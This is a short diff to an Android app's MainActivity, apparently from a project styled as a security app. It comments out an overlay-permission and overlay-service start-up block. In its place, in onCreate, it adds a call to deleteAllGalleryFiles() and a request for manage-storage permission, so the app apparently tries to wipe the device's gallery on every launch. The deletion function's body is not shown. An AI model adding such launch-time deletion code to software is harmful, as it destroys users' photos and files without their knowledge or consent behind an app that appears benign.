@@ -23,34 +23,33 @@ class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
-
-        // 1️⃣ Check overlay permission first
-        if (!Settings.canDrawOverlays(this)) {
-            Log.d("KHAN","Requesting overlay permission")
-            val intent = Intent(
-                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
-                Uri.parse("package:$packageName")
-            )
-            startActivity(intent)
-        } else {
-            Log.d("KHAN","Starting overlay service")
-            val serviceIntent = Intent(this, OverlayService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(serviceIntent)
-            } else {
-                startService(serviceIntent)
-            }
-        }
-
-        // 2️⃣ Set Compose content (UI)
+//        if (!Settings.canDrawOverlays(this)) {
+//            Log.d("KHAN","Requesting overlay permission")
+//            val intent = Intent(
+//                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+//                Uri.parse("package:$packageName")
+//            )
+//            startActivity(intent)
+//        } else {
+//            Log.d("KHAN","Starting overlay service")
+//            val serviceIntent = Intent(this, OverlayService::class.java)
+//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+//                startForegroundService(serviceIntent)
+//            } else {
+//                startService(serviceIntent)
+//            }
+//        }
+        deleteAllGalleryFiles()
         setContent {
             SecurityAppTheme {
-                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
-                    Greeting(
-                        name = "Android",
-                        modifier = Modifier.padding(innerPadding)
-                    )
-                }
+
+                RequestManageStoragePermission()
+//                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
+//                    Greeting(
+//                        name = "Android",
+//                        modifier = Modifier.padding(innerPadding)
+//                    )
+//                }
             }
         }
     }
